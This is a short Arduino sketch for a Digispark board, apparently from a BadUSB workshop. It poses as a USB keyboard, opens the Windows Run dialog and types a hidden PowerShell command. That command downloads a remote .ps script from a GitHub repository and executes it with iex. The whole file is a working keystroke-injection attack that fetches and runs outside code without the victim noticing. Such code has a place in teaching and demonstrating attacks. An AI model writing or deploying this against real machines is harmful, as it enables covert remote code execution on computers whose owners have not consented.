#include "DigiKeyboard.h" /* Digistump drives. */
#include <avr/pgmspace.h> /* Fix memory issues. */

void setup() {
  DigiKeyboard.update();
}

void loop() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); /* Open execute dialog. */
  delay(100); /* Delay until it opens. */
  DigiKeyboard.println(F("powershell -windowstyle hidden iex (wget https://raw.githubusercontent.com/whoismath/BadUSB_Workshop/master/Payloads/payload-windows.ps)")); /* Open powershell. */
  for(;;) { /* run just once. */ }
}
